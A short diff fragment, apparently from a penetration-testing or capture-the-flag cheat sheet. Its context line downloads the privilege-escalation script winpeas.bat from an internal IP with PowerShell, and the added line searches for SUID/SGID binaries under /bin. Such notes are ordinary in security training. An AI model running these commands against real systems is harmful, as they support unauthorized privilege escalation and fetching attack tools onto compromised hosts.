@@ -24,3 +24,4 @@ powershell Invoke-WebRequest -Uri http://10.8.102.117:80/winpeas.bat -Outfile 'C
 
 
 
+find / -perm +6000 2>/dev/null | grep '/bin/'
